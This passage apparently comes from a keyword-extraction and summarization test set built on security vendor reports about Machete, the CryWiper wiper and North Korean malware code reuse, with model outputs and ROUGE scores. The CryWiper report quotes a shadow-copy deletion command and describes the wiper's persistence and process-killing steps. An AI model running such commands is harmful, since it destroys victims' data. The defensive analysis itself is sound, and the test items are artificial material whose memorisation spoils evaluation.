geolocation coordinates when it \u2019s given other sources of data such as Bluetooth beacons , cell towers or Wi [LOC] - Fi access points . Then the malware takes latitude and longitude coordinates to build [LAW] a [LAW] Google [LAW] Maps [LAW] URL . Part of the code is shown in Figure [CARDINAL] 6.url the Machete | WeLiveSecurityFigure 6 . Code for geolocationThe advantage of using [ORG] Mozilla [ORG] Location [ORG] Service is that it permits geolocation without an actual GPS and can be more accurate than other methods . For example , an [ORG] IP address can be used to obtain an approximate location , but it is not so accurate . On the other hand , if there is available data for the area , [ORG] Mozilla [ORG] Location [ORG] Service can provide information such as in which building the target is located . The [NORP] GoogleUpdate.exe component is responsible for communicating with the remote [ORG] C&C server . The con\ufb01guration to set the connection is read from the jer.dll \ufb01le : domain name , username and password . The principal means of communication for [GPE] Machete is via [ORG] FTP , although HTTP communication was implemented as a fallback in 2019.This component uploads encrypted \ufb01les to different subdirectories on the [ORG] C&C server , but it also retrieves speci\ufb01c \ufb01les that have been put on the server by the [PERSON] Machete operators . This way , the malware can have its con\ufb01guration , malicious binaries and \ufb01le listings updated , but can also download and execute other binaries . In conclusion The [PERSON] Machete group is operating more strongly than ever , even after researchers have published technical descriptions and indicators of compromise for this malware . ESET has been tracking this threat for [DATE] months and has observed several changes , sometimes within [DATE] weeks . At the time of this publication , the latest change introduced [CARDINAL] six backdoor components , which are no longer py2exe executables . Python scripts for malicious components , an original executable for Python [CARDINAL] 2.7 , and all libraries used are packed into a self - extracting \ufb01le . Various artifacts that we have seen in [ORG] Machete \u2019s code and the underlying infrastructure lead us to think that this is a [LANGUAGE] Spanish - speaking group . The presence of code to ex\ufb01ltrate data to removable drives when there is physical access to a compromised computer may indicate that [GPE] Machete operators could have a presence in one of the targeted countries , although we can not be certain . A full and comprehensive list of Indicators of Compromise ( IoCs ) can be found in the full white paper and on [ORG] GitHub . ESET detects this threat as a variant of Python / [ORG] Machete . For a detailed analysis of the backdoor , refer to our white paper Machete just got sharper : [NORP] Venezuelan military under attack . For any inquiries , or to make sample submissions related to the subject , contact us at threatintel@eset.com.url the Machete | WeLiveSecurityESET Research 5 Aug [DATE] 2019 [DATE] - [DATE] 11:31AMurl", "generated_text": "the Machete malware; a new version; April 2018; spearphishing emails; targets; Latin American countries; the group; the mails; attachments; a decoy; a command; control; data; the backdoor; a clean installation; the malware; infrastructure; files; recommendations; tactics; the group; a year; tactics; backdoors; Zebra; POST; data exfiltration; the attacker; command; servers; targets; a network; a network; a RAT; the C&C server; a network; the C&C server; a new version; the Machete malware; documents; command; payloads; execution; the user; the malware; system info; attachments; a new backdoor; a compromise; the malware.", "ref_text": "<START-1>The document describes cyberespionage activities by a threat group tracked as Machete that has been targeting high-profile organizations in Latin America since at least 2014. Machete uses spearphishing emails containing malicious documents or links to deliver its Python-based malware to victims. It focuses on military and government entities in Venezuela, Ecuador, and other Latin American countries. The malware targets various file types, including Microsoft Office documents, backup files, database files, cryptographic keys, OpenOffice documents, vector images, and geographic information systems (topographic maps, navigation routes, etc.). The Machete group has introduced several changes to its malware since a new version was released in April 2018, making it more advanced and difficult to detect. The group steals sensitive documents from its targets, including military plans and geographic route data. It has exfiltrated gigabytes of data from over 50 compromised systems between March-May 2019. The malware features backdoor capabilities to take screenshots, log keystrokes, collect files, exfiltrate data, and retrieve additional payloads from the command and control server. Machete regularly updates its tactics, infrastructure, and malware code. The latest version uses multiple obfuscation techniques on its Python scripts and expanded communications via FTP/HTTP. The malware uses the Mozilla Location Service API for geolocation purposes, providing more accurate coordinates than other methods like IP addresses. The latest version of the Machete malware includes six backdoor components that are packed into a self-extracting file, making it even harder to detect and remove. The group leverages stolen documents as lures in phishing emails, sometimes on the same day the documents were taken from other victims. This shows their capability to quickly process and re-weaponize compromised data. While prior research has revealed details on Machete, the group remains highly active in cyberespionage against Latin American targets, particularly military and government organizations. Rapid introduction of new malware versions has allowed it to stay under the radar. Machete's continued success highlights the challenges of mitigating sophisticated, focused cyberespionage actors. Their adaptability, knowledge of targets' communication patterns, and operational security make them a persistent threat in the region. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.38524590163934425, "gpt3/lexical/rouge_rouge2": 0.11522633744855969, "gpt3/lexical/rouge_rougeL": 0.18032786885245902, "gpt3/lexical/rouge_rougeLsum": 0.18032786885245902, "gpt3_generated_text": ["The article discusses the ongoing case of cyberespionage in Latin America, targeting high-profile organizations and primarily stealing confidential documents from military organizations. The group behind these attacks, known as the Machete group, has been active since April 2018 and regularly updates its malware, infrastructure, and spearphishing campaigns. The group uses effective spearphishing techniques, sending specific emails containing links or attachments of compressed files that run the malware and open a decoy document. The Machete group is interested in stealing common office suite documents as well as specialized file types used by geographic information systems. The group has successfully compromised over 50 computers, with more than half belonging to the Venezuelan military forces. The article highlights the group's tactics, such as using real documents they have previously stolen as decoys and exploiting their knowledge of military jargon and etiquette to craft convincing"]}, {"split_name": "test", "sample_id": "test_29", "prompt_text": "Extract the keywords: [CARDINAL] securelist-ru.translate.goog /novyj - troyanec - crywiper/106114/ [PERSON] New [PERSON] Trojan [ORG] CryWiper pretends to be a ransomwareMost cyberattacks are financially motivated , but in [DATE] recent [DATE] years there has been an increase in the number of attacks whose goal is not to enrich , but to harm the victim . [CARDINAL] One of the tools of such attacks are wipers ( from the [LANGUAGE] English wiper ) - programs that destroy data without the possibility of recovery . The most notable wipers to come out in [DATE] 2022 include [ORG] DoubleZero , [ORG] IsaacWiper , [ORG] HermeticWiper , [ORG] CaddyWiper , [ORG] WhisperGate , [ORG] AcidRain , Industroyer2 and [GPE] RuRansom . In [DATE] the [DATE] fall [DATE] of [DATE] 2022 , our solutions detected attempts by a previously unknown [GPE] Trojan , which we called [ORG] CryWiper , to attack an organization 's network in [GPE] the [GPE] Russian [GPE] Federation . After examining a sample of malware , we found out that this [GPE] Trojan , although it masquerades as a ransomware and extorts money from the victim for \u201c decrypting \u201d data , does not actually encrypt , but purposefully destroys data in the affected system . Moreover , an analysis of the [GPE] Trojan 's program code showed that this was not a developer 's mistake , but his original intention . [ORG] CryWiper [ORG] Technical DetailsThe CryWiper sample that came to us is a [CARDINAL] 64 - bit executable file for Windows OS . The malware was developed in [LANGUAGE] C++ and compiled using the MinGW - w64 toolkit and the [ORG] GCC compiler . This is not the most common approach among C / C++ malware developers for Windows \u2014 the Microsoft [PERSON] Visual [PERSON] Studio development environment is more commonly used for such purposes . Building with [GPE] MinGW is advisable either when developing a cross - platform application for different operating systems ( for example , under [PRODUCT] Windows , Linux and / or FreeBSD ) , or if the developer himself uses something other than Windows as1/8the main OS . Note that in the case of [ORG] CryWiper , the [ORDINAL] first option is unlikely , since the [GPE] Trojan uses many calls to WinAPI functions . Sample build date , according to header [ORG] PE field : [DATE] 2022 [DATE] - 09 [DATE] - 06 11:08:54 . The [PERSON] Trojan sample was found along the following path:1 c:\\windows\\system32\\browserupdate.exeCryWiper algorithmCreate a task in the schedulerAfter starting [ORG] CryWiper using [PRODUCT] the [PRODUCT] Task [PRODUCT] Scheduler and the schtasks create command , it creates a task to run its own file every 5 minutes . Create a task in the schedulerCommunication with C&CThe Trojan then contacts its command and control server using an HTTP GET request and passes the name of the infected computer as a parameter.2/8CryWiper request and response from C&CIn response , the [ORG] C&C server sends the string run or do not run , which controls the behavior of the [GPE] Trojan . If run is returned , then [ORG] CryWiper will immediately start malicious activity . In all other cases , special logic is executed , which , judging by the results of our analysis , is conceived as a delay of [DATE] 4 [DATE] days ( [TIME] 345,600 [TIME] seconds ) . However , it was poorly implemented : the code is written in such a way that the malware will under no circumstances wait for the specified time and will simply terminate execution if it has not received the run command . [ORG] CryWiper saves the current time in the registry ( parameter HKCU\\Software\\Sysinternals\\BrowserUpdate\\Timestamp ) just before checking the response from the server . Having received the command do not runor not given instructions , it calculates how many seconds have passed since the stored moment , and if this value is [TIME] less [TIME] than [TIME] 345,600 [TIME] seconds , exits . At the same time , it will never be [TIME] more [TIME] than [TIME] 345,600 [TIME] seconds [TIME] - [TIME] in fact , the check takes only a fraction of a second . And the next time it is launched ( see above \u2014 the [GPE] Trojan created a task in the scheduler for this purpose ) , [ORG] CryWiper will overwrite the Timestamp value again .3/8Code that measures the time and checks the response from [ORG] C&CStop processes , change settingsAfter receiving a run response , [ORG] CryWiper stops processes related to the operation of MySQL and MS SQL database servers , MS Exchange mail server and [ORG] MS [ORG] Active [ORG] Directory web services using the taskkill command . The [PERSON] Trojan does this in order to have access to files that would be occupied by these processes if they were normal . Stopping processes and deleting shadow copiesIn addition , the [GPE] Trojan deletes shadow copies of files using the vssadmin delete shadows /for = c : /all command , which , however , only affects the C : drive . This is probably another oversight of the attacker . Also , an interesting detail is related to changing the HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\fDenyTSConnections registry setting , which is responsible for preventing connections to the system via [ORG] the [ORG] Remote [ORG] Desktop [ORG] Protocol ( RDP ) . In ransomware attacks , attackers often set this setting to [CARDINAL] 0 to allow RDP access to the system , such as for lateral distribution on a compromised network . Here we observe the opposite behavior : [ORG] CryWiper sets the value to [CARDINAL] 1 , which prohibits access via RDP.4/8RDP access deniedThe purpose of this action is not entirely clear . It is possible that in this way the [GPE] Trojan developer is trying to make life more difficult for the security and IT specialists who will be involved in responding to the incident - due to this setting , they will not be able to remotely connect to the infected system without additional actions . Data destructionTo destroy user files , [ORG] CryWiper generates a sequence of data using the well - known pseudo - random number generator \" [PERSON] Mersenne [PERSON] Vortex \" and writes this data instead of the original file content . When searching for custom files , [ORG] CryWiper skips those that have extensions or are located in the directories indicated in the table . Ignored file extensions .CRYSubstrings in the path to ignored directories [WORK_OF_ART] System [WORK_OF_ART] Volume [WORK_OF_ART] Information [WORK_OF_ART] Trend [WORK_OF_ART] MicroFiles with corrupted content receive an additional .CRY extension .5/8Part of the procedure that implements [FAC] the [FAC] Mersenne [FAC] Vortex [FAC] PRNG . Characteristic constants are distinguishedIt is noteworthy that the exact same algorithm for generating pseudo - random numbers was used by another viper - IsaacWiper . However , no other relationship between them could be found . In addition , they were used in attacks on various targets . So , [ORG] IsaacWiper was seen in attacks on the public sector in [GPE] Ukraine , and [ORG] CryWiper , according to our data , attacked an organization in [GPE] the [GPE] Russian [GPE] Federation . Part of a procedure that destroys the contents of filesCryWiper disguises itself as a ransomware and stores ransom demands in the [ORG] README.txt file . The text of the requirements uses typical ransomware language , and also provides the Bitcoin wallet address for paying the ransom , the email address for contacting the attackers , and the infection ID.The [ORG] CryWiper ID string is fixed , it is contained in the body of the [GPE] Trojan and does not change from launch to launch . In most ransomware , the ID is unique for each victim and is needed by attackers to determine6/8which victim paid the ransom and which did not . Although there are exceptions to this rule : if a new [ORG] Trojan sample is collected for each attack , then sometimes the ID is left fixed or even not used at all . [CARDINAL] One way or another , [ORG] CryWiper deliberately destroys the contents of files , which means that it makes no sense for attackers to distinguish [CARDINAL] one victim from another - there is nothing to decrypt after infection anyway . Text of [ORG] CryWiper requirements Relationship with other familiesIn terms of code and functionality , [ORG] CryWiper is a new malware that is not related to existing families . However , among vipers , the generation of random values \\u200b\\u200bwith the help of [FAC] the [FAC] Mersenne [FAC] Vortex is rarely used - simpler options are more common . The choice of algorithm in [ORG] CryWiper coincides with the previously mentioned [ORG] Isaa\u0441Wiper - the only one of the popular wipers that generates pseudo- random values using this algorithm . We found another rather interesting intersection with other malware when analyzing the email address in the note . It turned out that this address had already been used before , but not in wipers : it was contained in several ransomware samples ( for example , MD5 : [CARDINAL] 4A42F739CE694DB7B3CDD3C233CE7FB1 , 71D9E6EE26D46C4DBB3D8E6DF19DDA7D , [DATE] 0C6D33DA653230F56A7168E73F144 ) . [CARDINAL] Two of them belong to the well - known [ORG] Trojan [ORG] - Ransom . Win32.Xorist ransomware family , and the [ORDINAL] third is a lesser- known example from [ORG] the [ORG] Trojan [ORG] - Ransom . MSIL.Agent family . The earliest example using this address is dated mid [DATE] - June [DATE] 2017 . ConclusionCryWiper positions itself as a ransomware program , that is , it claims that the victim 's files are encrypted and , if a ransom is paid , they can be restored . However , this is a hoax : in fact , the data has been destroyed and can not be returned . The activity of [ORG] CryWiper once again shows that the payment of the ransom does not guarantee the recovery of files.7/8In many cases , wiper and ransomware incidents are caused by insufficient network security , and it is the strengthening of protection that should be paid attention to . We assume that the number of cyberattacks , including those using wipers , will grow , largely due to the unstable situation in the world . Therefore , the following will help reduce the likelihood of compromise and data loss during attacks by wipers and ransomware . Behavioral file analysis security solutions that detect and block malware , such as KES . [ORG] MDR - and SOC services that allow timely detection of an intrusion and take action to respond . Dynamic analysis of mail attachments and blocking of malicious files and URLs . This will make email attacks , [CARDINAL] one of the most common vectors , more difficult . Such functionality is available , for example , in [PERSON] Kaspersky [PERSON] Anti [PERSON] Targeted [PERSON] Attack ( KATA ) . Conducting regular penetration testing and [ORG] RedTeam projects . This will help to identify vulnerabilities in the organization 's infrastructure , protect them , and thereby significantly reduce the attack surface for intruders . Threat data monitoring . To detect and block malicious activity in a timely manner , it is necessary to have up - to - date information about the tactics , tools , and infrastructure of intruders . This requires c:\\windows\\system32\\browserupdate.exe - path to the [ORG] Trojan sample on the system", "generated_text": "the report; New Trojan CryWiper; an organization; 2022; Russia; the Russian Federation; malware; a ransomware; the victim; data; the attackers; winAPI; the malware; a task; a task; the scheduler; its own file; 5 minutes; the task; the scheduler; the registry; time; the time; the Trojan; a delay; 4 days; time; the registry; the time; the registry; Run; the time; the recommending process; the system; security features; the attackers; the code; threat intelligence; a threat actor.", "ref_text": "<START-1>The PDF describes a new data-destroying Trojan called CryWiper that was detected attacking an organization's network in Russia in Fall 2022. CryWiper pretends to be ransomware by leaving a ransom note demanding payment in bitcoin to decrypt files. However, analysis shows CryWiper does not actually encrypt files, but rather irreversibly overwrites them with pseudo-random data generated using the Mersenne Twister algorithm. CryWiper is a 64-bit Windows executable likely developed using MinGW on Linux. After starting via Task Scheduler, it contacts a command and control server to get the command 'run' which triggers destruction. It stops critical processes like databases and email servers to access occupied files. CryWiper skips files in certain directories like Windows and Trend Micro, but destroys documents, media, source code etc. The ransom note uses typical ransomware messaging, providing a BTC wallet, email contact, and fixed victim ID. But since the data is destroyed, the ID serves no purpose. The email address used was also found in past ransomware samples, suggesting possible code reuse. While CryWiper is a new family, the use of Mersenne Twister PRNG links it to IsaacWiper which targeted Ukraine. The code destruction approach shows the intent is disruption, not financial gain. The number of such wiper attacks is increasing amid geopolitical tensions. Protection requires behavioral detection, endpoint security, email scanning, penetration testing, threat monitoring, and threat intelligence. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.477326968973747, "gpt3/lexical/rouge_rouge2": 0.09592326139088728, "gpt3/lexical/rouge_rougeL": 0.25298329355608595, "gpt3/lexical/rouge_rougeLsum": 0.25298329355608595, "gpt3_generated_text": ["A new Trojan called CryWiper has been discovered in the fall of 2022, targeting an organization's network in Russia. Although it masquerades as a ransomware and extorts money from the victim for decrypting data, CryWiper actually destroys data in the affected system. The malware is a 64-bit executable file for Windows OS, developed in C++ and compiled using the MinGW-w64 toolkit and GCC compiler. CryWiper creates a task in the Task Scheduler to run its own file every 5 minutes. It communicates with its command and control server using an HTTP GET request and receives a command to either run or not run. If the run command is received, CryWiper stops processes related to database servers, mail servers, and web services, and deletes shadow copies of files on the C: drive. The Trojan also has a delay logic that poorly implemented, causing it to terminate execution if it does not receive the run command. Overall, CryWiper poses a significant threat to the security of an organization's data and system, and its discovery highlights the need for robust threat intelligence and security features to protect against such attacks."]}, {"split_name": "test", "sample_id": "test_30", "prompt_text": "Extract the keywords: \uf002\uf002Examining Code Reuse Reveals Undiscovered Links Among [GPE] North [GPE] Korea \u2019s [PERSON] Malware [PERSON] FamiliesBy [PERSON] Jay [PERSON] Rosenberg and [PERSON] Christiaan [PERSON] Beek on [DATE] Aug [DATE] 09 , 2018This research is a joint effort by [PERSON] Jay [PERSON] Rosenberg , senior security researcher at [ORG] Intezer , andPDFmyURL - online url to pdf conversionNewsletter [PERSON] Sign [PERSON] UpFirst [PERSON] Name * Last Name * [PERSON] Christiaan [PERSON] Beek , lead scientist and senior principal engineer at McAfee . [PERSON] Intezer has also posted this story . Email Address * Attacks from the online groups [ORG] Lazarus , [PERSON] Silent [PERSON] Chollima , Group [CARDINAL] 123 , [PERSON] Hidden [PERSON] Cobra , [ORG] DarkSeoul , [ORG] Blockbuster , [ORG] Operation [ORG] Troy , and [DATE] 10 [DATE] Days [DATE] of [DATE] Rain are believed to have come from [GPE] North [GPE] Korea . But how can we know with certainty ? And what connection does a [ORG] DDoS and disk - wiping attack from [DATE] July [DATE] 4 , [DATE] 2009 , have with [ORG] WannaCry , [CARDINAL] one of the largest cyberattacks in the history of the cyber sphere?Country * --Please Select -- SubmitFrom the [LOC] Mydoom variant [GPE] Brambul to the more recent [ORG] Fallchill , [ORG] WannaCry , and the targeting of cryptocurrency exchanges , we see a distinct timeline of attacks beginning from the moment [GPE] North [GPE] Korea entered the world stage as a significant threat actor . McAfee on Twitter \uf099 Follow us on [ORG] TwitterBad actors have a tendency to unwittingly leave fingerprints on their attacks , allowing researchers to connect the dots between them . [NORP] North [NORP] Korean actors have left many of these clues in their wake and throughout the evolution of their malware arsenal . This post reflects [DATE] months of research ; in it we will highlight our code analysis illustrating key similarities between samples attributed to [ORG] the [ORG] Democratic People \u2019s [ORG] Republic [ORG] of [ORG] Korea , a shared networking infrastructure , and other revealing data hidden within the binaries . Together these puzzle pieces show the connections between the many attacks attributed to [GPE] North [GPE] Korea and categorize different tools used by specific teams of their cyber army . Valuable contextThis article is too short to dig deeply into the history , politics , and economic changes of [DATE] recent [DATE] years . Nonetheless , we must highlight some events to put past and present cyber events into perspective . PDFmyURL - online url to pdf conversionmcafee_labsThreat actors continue to evolve their tools , increasing complexity and functionality . [ORG] Learn how these cybercrimes \u2026 url [TIME] 21 [TIME] hours [TIME] ago Reply \u00b7 [PERSON] Retweet \u00b7 Favoritemcafee_labsICYMI : Our team analyzed [PERSON] Operation [PERSON] GhostSecret , a [ORG] HiddenThe DPRK , like any country , wants to be as self - sufficient and independent as possible . However , for products such as oil , food , and foreign currency for trading , the country lacks resources and has to find ways of acquiring them . What can a nation do when legal international economics are denied ? To survive , it must gain foreign currency for trading . [CARDINAL] One of the oldest ways to do this is to join the worlds of gambling ( casinos ) and drugs . In [DATE] 2005 , [GPE] the [GPE] United [GPE] States wanted to shut down [NORP] North [NORP] Korean enterprises involved in illegal operations . They investigated a couple of banks in [LOC] Asia that seemed to have ties with [GPE] North [GPE] Korea and operated as money laundering sites . [CARDINAL] One bank in particular is controlled by a billionaire gambling mogul who started a casino in [GPE] Pyongyang and has close ties to [GPE] Pyongyang . That bank , based in [GPE] Macau , came back into the picture during an attack on the SWIFT financial system of a bank in [GPE] Vietnam in [DATE] 2015 . The [GPE] Macau bank was listed twice in the malware \u2019s code as a recipient of stolen funds : Cobra campaign that leveraged multiple # malware implants i \u2026 url [TIME] 22 [TIME] hours [TIME] ago Reply \u00b7 [PERSON] Retweet \u00b7 [PERSON] Favoritemcafee_labsBad actors are exploiting connected home devices to find new innocent targets . Which connected device do you think \u2026 url [DATE] 2 [DATE] days [DATE] ago Reply \u00b7 [PERSON] Retweet \u00b7 [PERSON] FavoriteNext ArticlePDFmyURL - online url to pdf conversionConsumer Threat Notices 5 Tips To Protect Your IoT DevicesFigure 1 : SWIFT code in malware . Code reusePDFmyURL - online url to pdf conversionThere are many reasons to reuse malware code , which is very common in the world of cybercrime . If we take an average ransomware campaign , for example , once the campaign becomes less successful , actors often change some of basics such as using a different packer to bypass defenses . With targeted campaigns , an adversary must keep its tools undetected for as long as possible . By identifying reused code , we gain valuable insights about the \u201c ancestral relations \u201d to known threat actors or other campaigns . Our research was heavily focused on this type of analysis . In [DATE] our [DATE] years of investigating cyber threats , we have seen the DPRK conduct multiple cyber campaigns . In [GPE] North [GPE] Korea , hackers \u2019 skills determine which cyber units they work for . We are aware [CARDINAL] two major focuses of DPRK campaigns : [CARDINAL] one to raise money , and one to pursue nationalist aims . The [ORDINAL] first workforce gathers money for the nation , even if that means committing cybercrime to hack into financial institutions , hijack gambling sessions , or sell pirated and cracked software . Unit [CARDINAL] 180 is responsible for illegally gaining foreign currency using hacking techniques . The [ORDINAL] second workforce operates larger campaigns motivated by nationalism , gathering intelligence from other nations , and in some cases disrupting rival states and military targets . Most of these actions are executed by [ORG] Unit [ORG] 121.We focused in our research on the larger - scale nationalism - motivated campaigns , in which we discovered many overlaps in code reuse . We are highly confident that nation- state \u2013 sponsored groups were active in these efforts . TimelineWe created a timeline of most of the malware samples and noticeable campaigns that we examined . We used primarily open - source blogs and papers to build this timeline and used the malware artifacts as a starting point of our research . PDFmyURL - online url to pdf conversionFigure [CARDINAL] 2 : Timeline of malware and campaigns . Analysis and observationsSimilaritiesDuring our research , we found many malware family names that are believed to be associated with [GPE] North [GPE] Korea \u2019s cyber operations . To better understand this threat actor and the similarities between the campaigns , we have used [PERSON] Intezer \u2019s code similarity detection engine to plot the links between a vast number of these malware families . The following graph presents a high - level overview of these relations . Each nodePDFmyURL - online url to pdf conversionrepresents a malware family or a hacking tool ( \u201c [GPE] Brambul , \u201d \u201c Fallchill , \u201d etc . ) and each line presents a code similarity between [CARDINAL] two families . A thicker line correlates to a stronger similarity . In defining similarities , we take into account only unique code connections , and disregard common code or libraries . This definition holds both for this graph and our entire research . PDFmyURL - online url to pdf conversionFigure [CARDINAL] 3 : Code similarities between [NORP] North [NORP] Korean \u2013 associated malware families . PDFmyURL - online url to pdf conversionWe can easily see a significant amount of code similarities between almost every one of the attacks associated with [GPE] North [GPE] Korea . Our research included [CARDINAL] thousands of samples , mostly unclassified or uncategorized . This graph was plotted using a data set of [CARDINAL] only [CARDINAL] several [CARDINAL] hundred samples , so there might be more connections than displayed here . Deep technical analysisDuring our research , we came across many code similarities between [NORP] North [NORP] Korean binaries that had not been seen before . Some of these attacks and malware have not been linked to one another , at least publicly . We will showcase [CARDINAL] four examples of reused code that has been seen only in malware attributed to [GPE] North [GPE] Korea.1 . Common SMB moduleThe [ORDINAL] first code example appeared in the server message block ( SMB ) module of [ORG] WannaCry in [DATE] 2017 , Mydoom in [DATE] 2009 , [PERSON] Joanap , and [PRODUCT] DeltaAlfa . Further shared code across these families is an AES library from [ORG] CodeProject . These attacks have been attributed to [ORG] Lazarus ; that means the group has reused code from [DATE] at [DATE] least [DATE] 2009 to [CARDINAL] 2017.PDFmyURL - online url to pdf conversionFigure [CARDINAL] 4 : Code overlap of a [LOC] Mydoom sample . In the next screenshots we highlight the exact code block that reflects the [ORG] SMB module we found in campaigns other than [ORG] WannaCry and [ORG] Mydoom . PDFmyURL - online url to pdf conversionPDFmyURL - online url to pdf conversionFigure [CARDINAL] 5 : An [ORG] SMB module common to several attacks . A lot has been written about [ORG] WannaCry . As we analyze the code against our databases , we can draw the following overview : PDFmyURL - online url to pdf conversionFigure [CARDINAL] 6 : [ORG] WannaCry code comparison overview . For our research we compared the [CARDINAL] three major variants of [ORG] WannaCry . An early release , called a beta , from [DATE] February [DATE] 2017 , [CARDINAL] one from [DATE] April , and the infamous one that hit the world in [PERSON] May.2 . Common file mappingThe [ORDINAL] second example demonstrates code responsible for mapping a file and using the [LAW] XOR key [CARDINAL] 0xDEADBEEF on the [ORDINAL] first [CARDINAL] four bytes of the file . This code has appeared in thePDFmyURL - online url to pdf conversionmalware families [ORG] NavRAT and Gold Dragon , plus a certain [ORG] DLL from the [NORP] South [NORP] Korean gambling hacking campaign . These [CARDINAL] three RATs are thought to be affiliated with [GPE] North [GPE] Korea \u2019s Group [CARDINAL] 123 . [ORG] NavRAT and the gambling [ORG] DLL share more code , making them closer variants . Figure [CARDINAL] 7 : Code overlap in a [ORG] NavRAT sample . PDFmyURL - online url to pdf conversionPDFmyURL - online url to pdf conversionFigure [CARDINAL] 8 : File - mapping code3 . Unique net shareThe [ORDINAL] third example , responsible for launching a cmd.exe with a net share , has been seen in [DATE] 2009 \u2019s [GPE] Brambul , also known as [ORG] SierraBravo , as well as [ORG] KorDllBot in [DATE] 2011 . These malware families are also attributed to the [ORG] Lazarus group . Figure [CARDINAL] 9 : Code overlap of a [WORK_OF_ART] SierraBravo ( [WORK_OF_ART] Brambul ) sample . PDFmyURL - online url to pdf conversionPDFmyURL - online url to pdf conversionFigure [CARDINAL] 10 : A code block reused in the malware families [GPE] Brambul / SierraBravo and KorDllBot.4 . Operation Dark HotelIn [DATE] 2014 , [PERSON] Kaspersky reported a [CARDINAL] more [CARDINAL] than seven - year campaign against [NORP] Asian hotels , in which the adversaries used an arsenal of tools to break into the computers of hotel visitors . [DATE] Zero [DATE] days and control servers were used , along with the malware family Tapaoux , or [ORG] DarkHotel , according to the report . While we examined the DPRK samples , we noticed a hit with the Dark Hotel samples in our collections . By going through the code , we noticed several pieces of code overlap and reuse , for example , with samples from [GPE] Operation [GPE] Troy . PDFmyURL - online url to pdf conversionFigure [CARDINAL] 11 : Code overlap in a [ORG] Dark [ORG] Hotel sample . Identifying a groupBy applying what we learned from our comparisons and code - block identifications , we uncovered possible new links between malware families and the groups using them . With the different pieces of malware we have analyzed , we can illustrate the code reuse and sharing between the groups known to be affiliated with [GPE] North [GPE] Korea . PDFmyURL - online url to pdf conversionFigure [CARDINAL] 12 : [ORG] Groups and families linked by code reuse . PDFmyURL - online url to pdf conversionThe malware attributed to the group [ORG] Lazarus has code connections that link many of the malware families spotted over [DATE] the [DATE] years . [ORG] Lazarus is a collective name for many DPRK cyber operations , and we clearly see links between malware families used in different campaigns . The malware ( [ORG] NavRAT , gambling , and Gold Dragon ) possibly created by [ORG] Group [CARDINAL] 123 are connected to each other but are separate from those used by [ORG] Lazarus . Although these are different units focusing on different areas , there seems to be a parallel structure in which they collaborate during certain campaigns . MITRE ATT&CKFrom our research of these malware samples , we can identify the following techniques used by the malware families : When we zoom in on the [PRODUCT] Discovery category in the MITRE model , for example , we notice that the techniques are typical for [ORDINAL] first - stage dropper malware . The adversary dropsPDFmyURL - online url to pdf conversionthese samples on victims \u2019 machines and collects information on where they landed in the victims \u2019 networks and which user / access rights they gained . In [DATE] 2018 , we saw examples of campaigns in which attackers used [ORG] PowerShell to download and execute these droppers . Once information has been sent to a control server , the adversary determines the next steps , which often include installing a remote access tool to enable lateral movement on the network and pursue the goals of the campaign . Final wordsSecurity vendors and researchers often use different names when speaking about the same malware , group , or attack . This habit makes it challenging to group all the malware and campaigns . By taking a scientific approach , such as looking for code reuse , we can categorize our findings . We believe our research will help the security community organize the current \u201c mess \u201d we face in relation to [NORP] North [NORP] Korean malware and campaigns . We clearly saw a lot of code reuse over [DATE] the [DATE] many [DATE] years of cyber campaigns we examined . This indicates [NORP] the [NORP] North [NORP] Koreans have groups with different skills and tools that execute their focused parts of cyber operations while also working in parallel when large campaigns require a mix of skills and tools . We found our months of research , data gathering , and analysis very satisfying . By combining our skills , data , and technology , we were able to draw connections and reveal links that we had not seen before . The cybersecurity industry would greatly benefit from more collaboration and sharing of information , and we hope that this effort between [PERSON] McAfee and [PERSON] Intezer will inspire the community to work together more often . The authors thank [PERSON] Costin [PERSON] Raiu for providing them with samples they did not have in their collections . PDFmyURL - online url to pdf conversionSourcesGlenn [PERSON] Simpson , [PERSON] Gordon [PERSON] Fairclough , and [PERSON] Jay [PERSON] Solomon , \u201c [WORK_OF_ART] U.S. [WORK_OF_ART] Probes [WORK_OF_ART] Banks \u2019 [GPE] North [GPE] Korea [GPE] Ties . \u201d [ORG] Wall [ORG] Street [ORG] Journal , last updated [DATE] September [DATE] 8 , 2005.Christiaan Beek , \u201c Attacks on SWIFT Banking system benefit from insider knowledge . \u201d url benefit - insider - knowledge / [PERSON] Atif [PERSON] Mushtaq , \u201c [WORK_OF_ART] DDOS [WORK_OF_ART] Madness [WORK_OF_ART] Continued \u2026 \u201d url research/2009/07 / ddos - madness - climax.htmlRyan Sherstobitoff and [PERSON] Jessica Saavedra - Morales , \u201c Gold Dragon Widens Olympics Malware Attacks , Gains Permanent Presence on Victims \u2019 Systems . \u201d url malware - attacks - gains - permanent - presence - on - victims - systems / [PERSON] Alex [PERSON] Drozhzhin , \u201c Darkhotel : a spy campaign in luxury [NORP] Asian hotels . \u201d url [PERSON] Mercer , [PERSON] Paul [PERSON] Rascagneres , and [PERSON] Jungsoo [PERSON] An , \u201c [ORG] NavRAT Uses [GPE] US - North Korea Summit As Decoy For Attacks In [GPE] South [GPE] Korea . \u201d url [WORK_OF_ART] Shevchenko [WORK_OF_ART] and [WORK_OF_ART] Adrian [WORK_OF_ART] Nish , \u201c [WORK_OF_ART] Cyber [WORK_OF_ART] Heist [WORK_OF_ART] Attribution . \u201d url code reuse report . url#/analyses/113ba80f-1680 - 43d7- b287 - cc62f3740fadPDFmyURL - online url to pdf [NORP] conversionNavRAT code reuse report . url#/analyses/4f19fd5a - a898 - 4fdf- 96c9 - d3a4aad817cbSierraBravo code reuse report . url#/analyses/8da8104e-56e4- [ORDINAL] 49fd - ba24 - [CARDINAL] 82978bc1610cDark Hotel code reuse report . url#/analyses / c034e0fe-7825- 4f6d - b092 - 7c5ee693aff4Kang Jang - ho , \u201c A foreign currency earned with a virtual currency \u2026 What is the life of a [NORP] North [NORP] Korean hacker ? \u201d url mmn_idx=2018062517065863930#_enlipleAwesome work by the team responsible for [EVENT] the \u201c [EVENT] Operation [EVENT] Blockbuster \u201d report . url\uf104 Previous [ORG] ArticleNext [ORG] Article \uf105\uf07c Categories : McAfee Labs \uf02c Tags : advanced persistent threats , [ORG] Advanced [ORG] Threat [ORG] Research , cybersecurity , hackingLeave a replyFacebook [WORK_OF_ART] Comments ( 0 ) Comments ( 0 ) [PERSON] G+ CommentsPDFmyURL - online url to pdf conversion0 [ORG] CommentsSort byOldestAdd a comment [ORG] 